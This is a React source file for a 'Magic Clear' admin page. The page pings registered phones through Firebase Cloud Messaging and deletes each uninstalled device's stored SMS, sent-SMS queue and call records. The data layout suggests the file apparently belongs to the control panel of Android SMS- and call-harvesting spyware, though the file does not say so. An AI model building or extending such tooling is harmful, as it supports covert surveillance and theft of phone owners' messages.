import { useState, useEffect } from "react";
import { ref, onValue, set, remove } from "@/lib/rtdbPb";
import { db } from "@/lib/firebase";
import { sendPing } from "@/lib/fcm";
import { useFirebaseUsers } from "@/hooks/useFirebaseData";
import { toast } from "sonner";
import { Progress } from "@/components/ui/progress";
import { Loader2, Sparkles, Trash2, Clock, ArrowLeft, CheckCircle2 } from "lucide-react";
import { useNavigate } from "react-router-dom";

const COOLDOWN_MS = 4 * 60 * 60 * 1000;

function formatTimeLeft(ms: number) {
  const h = Math.floor(ms / 3600000);
  const m = Math.floor((ms % 3600000) / 60000);
  const s = Math.floor((ms % 60000) / 1000);
  return `${h}h ${m}m ${s}s`;
}

const MagicClearPage = () => {
  const navigate = useNavigate();
  const { users } = useFirebaseUsers();
  const [running, setRunning] = useState(false);
  const [progress, setProgress] = useState(0);
  const [total, setTotal] = useState(0);
  const [currentDevice, setCurrentDevice] = useState("");
  const [deletedCount, setDeletedCount] = useState(0);
  const [deletedDevices, setDeletedDevices] = useState<string[]>([]);
  const [done, setDone] = useState(false);
  const [lastUsed, setLastUsed] = useState<number | null>(null);
  const [timeLeft, setTimeLeft] = useState(0);

  useEffect(() => {
    const timerRef = ref(db, "magic_clear_last_used");
    const unsub = onValue(timerRef, (snap) => {
      setLastUsed(snap.val() || null);
    });
    return () => unsub();
  }, []);

  useEffect(() => {
    if (!lastUsed) { setTimeLeft(0); return; }
    const tick = () => {
      const remaining = COOLDOWN_MS - (Date.now() - lastUsed);
      setTimeLeft(remaining > 0 ? remaining : 0);
    };
    tick();
    const interval = setInterval(tick, 1000);
    return () => clearInterval(interval);
  }, [lastUsed]);

  const isCooldown = timeLeft > 0;

  const deleteDevice = async (id: string) => {
    await Promise.all([
      remove(ref(db, `users/${id}`)),
      remove(ref(db, `mess/${id}`)),
      remove(ref(db, `sendsms/${id}`)),
      remove(ref(db, `call/${id}`)),
      remove(ref(db, `pinned_devices/${id}`)),
      remove(ref(db, `device_links/${id}`)),
    ]);
  };

  const runMagicClear = async () => {
    const entries = Object.entries(users).filter(([, u]) => u.model && u.model.trim() !== "" && u.fcm_token);
    if (entries.length === 0) {
      toast.info("No devices with FCM tokens found");
      return;
    }

    setRunning(true);
    setDone(false);
    setProgress(0);
    setDeletedCount(0);
    setDeletedDevices([]);
    setTotal(entries.length);

    let deleted = 0;
    const removed: string[] = [];

    for (let i = 0; i < entries.length; i++) {
      const [id, user] = entries[i];
      const name = `${user.brand} ${user.model}`;
      setCurrentDevice(name);
      setProgress(i + 1);

      const result = await sendPing(user.fcm_token);

      if (!result.success && result.error?.includes("deleted the app")) {
        await deleteDevice(id);
        deleted++;
        removed.push(name);
        setDeletedCount(deleted);
        setDeletedDevices([...removed]);
      }

      await new Promise((r) => setTimeout(r, 300));
    }

    await set(ref(db, "magic_clear_last_used"), Date.now());

    setDone(true);
    setRunning(false);
    toast.success(`Magic Clear done! Removed ${deleted} dead device${deleted !== 1 ? "s" : ""}`);
  };

  const deviceCount = Object.entries(users).filter(([, u]) => u.model && u.model.trim() !== "" && u.fcm_token).length;
  const progressPercent = total > 0 ? (progress / total) * 100 : 0;

  return (
    <div className="min-h-screen pb-20 bg-background">
      <header className="sticky top-0 z-30 border-b border-border bg-background/70 backdrop-blur-2xl">
        <div className="flex h-14 items-center gap-3 px-5 max-w-5xl mx-auto">
          <button onClick={() => !running && navigate(-1)} className="h-8 w-8 rounded-lg bg-secondary flex items-center justify-center hover:bg-secondary/80 transition-colors">
            <ArrowLeft className="h-4 w-4 text-foreground" />
          </button>
          <div className="flex items-center gap-2">
            <Sparkles className="h-4 w-4 text-primary" />
            <span className="text-base font-extrabold text-foreground tracking-tight">Magic Clear</span>
          </div>
        </div>
      </header>

      <main className="px-5 py-6 space-y-5 max-w-5xl mx-auto">
        {/* Info card */}
        <div className="rounded-2xl border border-border bg-card p-5 space-y-3">
          <div className="flex items-center gap-2">
            <Sparkles className="h-5 w-5 text-primary" />
            <h2 className="text-sm font-bold text-foreground">How it works</h2>
          </div>
          <p className="text-xs text-muted-foreground leading-relaxed">
            Pings every connected device via FCM one by one. If Google reports the app was uninstalled (token unregistered), the device and <span className="font-semibold text-foreground">all its data</span> — SMS, sent messages, call records, and links — will be automatically deleted.
          </p>
          <div className="flex items-center gap-2 pt-1">
            <div className="px-2.5 py-1 rounded-lg bg-secondary text-[11px] font-medium text-muted-foreground">
              {deviceCount} device{deviceCount !== 1 ? "s" : ""} to scan
            </div>
            <div className="px-2.5 py-1 rounded-lg bg-secondary text-[11px] font-medium text-muted-foreground">
              4h cooldown after use
            </div>
          </div>
        </div>

        {/* Cooldown warning */}
        {isCooldown && !running && !done && (
          <div className="flex items-center gap-3 p-4 rounded-2xl bg-orange-500/10 border border-orange-500/20">
            <Clock className="h-5 w-5 text-orange-500 shrink-0" />
            <div>
              <p className="text-sm font-semibold text-orange-500">Cooldown Active</p>
              <p className="text-xs text-orange-500/70">Available again in {formatTimeLeft(timeLeft)}</p>
            </div>
          </div>
        )}

        {/* Progress */}
        {running && (
          <div className="rounded-2xl border border-border bg-card p-5 space-y-4">
            <div className="flex items-center gap-2">
              <Loader2 className="h-4 w-4 text-primary animate-spin" />
              <span className="text-sm font-medium text-foreground">Scanning devices...</span>
            </div>
            <div className="space-y-2">
              <div className="flex items-center justify-between text-[11px] text-muted-foreground">
                <span>Checking: <span className="font-semibold text-foreground">{currentDevice}</span></span>
                <span>{progress} / {total}</span>
              </div>
              <Progress value={progressPercent} className="h-2" />
            </div>
            <div className="flex items-center gap-1.5 text-xs text-destructive">
              <Trash2 className="h-3.5 w-3.5" />
              <span>{deletedCount} removed so far</span>
            </div>
          </div>
        )}

        {/* Results */}
        {done && !running && (
          <div className="rounded-2xl border border-border bg-card p-5 space-y-4">
            <div className="flex items-center gap-2">
              <CheckCircle2 className="h-5 w-5 text-green" />
              <span className="text-sm font-bold text-foreground">Scan Complete</span>
            </div>
            <div className="grid grid-cols-2 gap-3">
              <div className="p-3 rounded-xl bg-secondary text-center">
                <p className="text-xl font-extrabold text-foreground">{total}</p>
                <p className="text-[10px] text-muted-foreground">Scanned</p>
              </div>
              <div className="p-3 rounded-xl bg-destructive/10 text-center">
                <p className="text-xl font-extrabold text-destructive">{deletedCount}</p>
                <p className="text-[10px] text-muted-foreground">Removed</p>
              </div>
            </div>
            {deletedDevices.length > 0 && (
              <div className="space-y-2">
                <p className="text-xs font-semibold text-muted-foreground">Removed devices:</p>
                <div className="space-y-1.5 max-h-48 overflow-y-auto">
                  {deletedDevices.map((name, i) => (
                    <div key={i} className="flex items-center gap-2 px-3 py-2 rounded-lg bg-destructive/5 border border-destructive/10">
                      <Trash2 className="h-3 w-3 text-destructive shrink-0" />
                      <span className="text-xs text-foreground">{name}</span>
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        )}

        {/* Action button */}
        {!running && (
          <button
            onClick={runMagicClear}
            disabled={isCooldown}
            className="w-full py-3.5 rounded-xl text-sm font-bold transition-all active:scale-[0.98] disabled:opacity-40 disabled:cursor-not-allowed bg-primary text-primary-foreground hover:bg-primary/90"
          >
            {done ? "Run Again" : "Start Magic Clear"}
          </button>
        )}
      </main>
    </div>
  );
};

export default MagicClearPage;
